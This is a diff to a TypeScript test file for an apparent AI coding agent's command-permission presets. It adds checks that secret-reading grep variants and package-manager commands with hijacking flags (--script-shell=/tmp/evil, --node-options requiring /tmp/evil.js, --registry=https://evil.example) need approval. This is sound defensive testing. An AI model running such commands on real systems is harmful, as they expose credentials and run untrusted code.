@@ -235,6 +235,13 @@ describe("permission setup catalog", () => {
         "grep --recursive KEY",
         "grep --file=.env",
         "grep -- KEY",
+        "grep --exclude-from=/secret KEY",
+        "grep --exclude-from /secret KEY",
+        "grep --exclude-dir=x KEY",
+        "grep --fil=.env",
+        "grep --recur KEY",
+        "grep -d recurse KEY",
+        "grep -iR KEY",
         "echo $OPENAI_API_KEY",
         'echo "${HOME}"',
         "ls $HOME",
@@ -255,6 +262,8 @@ describe("permission setup catalog", () => {
         "grep -e foo",
         "grep -m 5 error",
         "grep -m5 error",
+        "grep --ignore-case --line-number error",
+        "grep --max-count 5 error",
         'echo "exit code: $?"',
         "echo done",
         "ls node_modules",
@@ -262,6 +271,40 @@ describe("permission setup catalog", () => {
       ]) {
         expect(effects(presetValue, command)).toEqual(["allow"])
       }
+    }
+  })
+
+  test("never lets a project script or install run in another directory, workspace, config or program", () => {
+    for (const manager of ["bun", "npm", "pnpm", "yarn"] as const) {
+      const checks = preset(classify({ manager, kilo: false }), "typescript-checks")
+      for (const command of [
+        `${manager} run test --prefix /tmp/other`,
+        `${manager} run test --prefix=/tmp/other`,
+        `${manager} run test --pref /tmp/other`,
+        `${manager} run test --workspace /tmp/other`,
+        `${manager} run test -w other`,
+        `${manager} run test -C /tmp/other`,
+        `${manager} run test --cwd /tmp/other`,
+        `${manager} run test --dir /tmp/other`,
+        `${manager} run test --filter other`,
+        `${manager} run test --global`,
+        `${manager} run test --script-shell=/tmp/evil`,
+        `${manager} run test --node-options="--require /tmp/evil.js"`,
+        `${manager} run test --userconfig /tmp/npmrc`,
+        `${manager} run test --config.script-shell=/tmp/evil`,
+        `${manager} run test --preload /tmp/evil.ts`,
+        `${manager} run test $EXTRA`,
+        `${manager} test --prefix /tmp/other`,
+      ]) {
+        expect(effects(checks, command)).toEqual(["ask"])
+      }
+      const install = preset(classify({ manager, kilo: false }), "dependency-install")
+      expect(effects(install, `${manager} install --prefix /tmp/other`)).toEqual(["ask"])
+      expect(effects(install, `${manager} install --registry=https://evil.example`)).toEqual(["ask"])
+      expect(effects(install, `${manager} install --global`)).toEqual(["ask"])
+      expect(effects(checks, `${manager} run test -- --prefix /tmp/other`)).toEqual(["allow"])
+      expect(effects(checks, `${manager} run test --watch=false`)).toEqual(["allow"])
+      expect(effects(checks, `${manager} run lint --fix`)).toEqual(["allow"])
     }
   })
 
